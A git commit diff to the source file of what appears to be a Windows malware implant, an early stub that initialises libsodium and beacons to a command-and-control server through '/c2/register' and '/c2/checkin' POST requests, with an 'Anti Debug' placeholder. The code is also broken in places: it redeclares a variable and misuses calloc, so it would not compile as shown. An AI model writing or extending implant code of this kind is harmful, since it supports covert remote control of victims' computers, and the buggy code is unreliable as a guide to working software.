49e6a8eb43171913345ef9959718e17d5278f340
Carter Brainerd <0xCB@protonmail.com>
2023-04-10 11:24:35 -0400

    Work more on crypto stuff

--- implant/src/main.cpp
+++ implant/src/main.cpp
@@ -2,22 +2,28 @@
 #include <winhttp.h>
 #include <iostream>
 #include <stdio.h>
-// #include "sodium/sodium.h"
+#include <sodium.h>
 #include <string.h>
+#include <vector>
 // #include "obfuscator/MetaString.h"
 #include "rapidjson/rapidjson.h"
 #include "rapidjson/document.h"
-#include "crypto.h"
+//#include "crypto.h"
 #include "httpclient.h"
 
 using namespace std;
 //using namespace andrivet::ADVobfuscator;
 
+#ifndef DEBUG
+#define DEBUG 0
+#endif
+
+
 int main()
 {
-    // if (sodium_init() < 0) {
-    //     return 1;
-    // }
+    if (sodium_init() < 0) {
+        return 1;
+    }
 
     // Anti Debug
 
@@ -29,98 +35,27 @@ int main()
     PSIZE_T outSize;
 
     cout << key_json << endl;
-    // cout << wcslen(key_json) << endl;
     
-    unsigned char* privKey = (unsigned char*)malloc(32);
-    unsigned char* pubKey = (unsigned char*)malloc(32);
-
     // int status = createKeyPair(privKey, pubKey);
-    cout << "privkey: " << privKey << "\n pubkey: " << pubKey << endl;
+    // cout << "privkey: " << privKey << "\n pubkey: " << pubKey << endl;
+    // string b64PubKey = base64_encode(std::vector<unsigned char>(pubKey, pubKey + 32));
+    // cout << "b64PubKey: " << b64PubKey << endl;
+    // string b64PrivKey = base64_encode(std::vector<unsigned char>(privKey, privKey + 32));
+    // cout << "b64PrivKey: " << b64PrivKey << endl;
     // Register
     LPBYTE res = HTTPRequest(L"POST", c2, L"/c2/register", 8080, L"Hello-world", (LPBYTE)key_json, strlen(key_json), outSize, FALSE);
     
-    // do stuff with the response
+    // // do stuff with the response
     Sleep(1);
-    // Checkin loop
+    // // Checkin loop
     LPBYTE checkinRes = HTTPRequest(L"POST", c2, L"/c2/checkin", 8080, L"Hello-world", (LPBYTE)key_json, strlen(key_json), outSize, FALSE);
     rapidjson::Document document;
     void* answer_str = calloc(0, *outSize + 1);
     memcpy(answer_str, checkinRes, *outSize);
-    document.Parse((char*)answer_str);
-    // rapidjson::Value& v = document["hi"]
+    const char* answer_str = "{\"hello\": \"world\"}";
+    document.Parse(answer_str);
     printf("hello = %s\n", document["hello"].GetString());
     return 0; 
 }
 
-// void HTTP() {
-//     HINTERNET hSession = NULL;
-//     HINTERNET hConnect = NULL;
-//     HINTERNET hRequest = NULL;
-//     BOOL bResult = FALSE;
-//     DWORD dwSize = 0;
-//     DWORD dwDownloaded = 0;
-//     LPSTR pszOutBuffer;
 
-//     // Open a session.
-//     hSession = WinHttpOpen(L"WinHTTP Example/1.0",
-//                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-//                            WINHTTP_NO_PROXY_NAME,
-//                            WINHTTP_NO_PROXY_BYPASS, 0);
-
-//     // Specify the server and port to connect to.
-//     hConnect = WinHttpConnect(hSession, L"localhost", 8080, 0);
-
-//     // Create an HTTP request handle.
-//     hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/c2/register",
-//                                   NULL, WINHTTP_NO_REFERER,
-//                                   WINHTTP_DEFAULT_ACCEPT_TYPES,
-//                                   0);
-
-
-    
-
-//     cout << "Sending req" << endl;
-    
-//     // Send the HTTP request.
-//     bResult = WinHttpSendRequest(hRequest,
-//                                  WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-//                                  key_json, strlen(key_json),
-//                                  strlen(key_json), 0);
-    
-//     if (bResult)
-//     {
-//         cout << "Waiting for response" << endl;
-//         // Wait for the response.
-//         bResult = WinHttpReceiveResponse(hRequest, NULL);
-//     }
-
-//     if (bResult)
-//     {
-//         // Get the content length.
-//         dwSize = 0;
-//         WinHttpQueryDataAvailable(hRequest, &dwSize);
-
-//         // Allocate memory for the response buffer.
-//         pszOutBuffer = new char[dwSize + 1];
-
-//         // Read the response into the buffer.
-//         ZeroMemory(pszOutBuffer, dwSize + 1);
-//         if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
-//         {
-//             // Print the response.
-//             cout << "Response: " << endl << pszOutBuffer << endl;
-//         }
-
-//         // Free the memory allocated to the buffer.
-//         delete[] pszOutBuffer;
-//     }
-
-//     // Close the request handle.
-//     if (hRequest) WinHttpCloseHandle(hRequest);
-
-//     // Close the connection handle.
-//     if (hConnect) WinHttpCloseHandle(hConnect);
-
-//     // Close the session handle.
-//     if (hSession) WinHttpCloseHandle(hSession);
-// }
